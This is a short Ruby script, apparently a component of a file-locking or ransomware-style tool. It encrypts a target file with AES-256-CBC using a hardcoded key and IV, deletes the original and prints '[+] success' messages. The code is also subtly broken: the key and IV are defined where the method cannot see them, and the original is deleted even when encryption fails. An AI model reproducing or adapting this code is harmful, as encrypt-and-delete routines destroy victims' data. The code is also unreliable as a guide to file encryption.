require 'chilkat'
require_relative 'colorama.rb'
class Dec

@ivHex = "000102030405060708090A0B0C0D0E0F"
@keyHex = "000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F"

def cry(inFile)
crypt = Chilkat::CkCrypt2.new()
crypt.put_CryptAlgorithm("aes")
crypt.put_CipherMode("cbc")
crypt.put_KeyLength(256)
crypt.put_PaddingScheme(0)
crypt.SetEncodedIV(@ivHex,"hex")
crypt.SetEncodedKey(@keyHex,"hex")
outFile = inFile+"n"
success = crypt.CkEncryptFile(inFile,outFile)

File.delete(inFile) if File.exist?(inFile)
if (success != true)
    print crypt.lastErrorText()+"\n".red;
else
    puts "[+] success ... complete #{inFile}".green

end
end
end
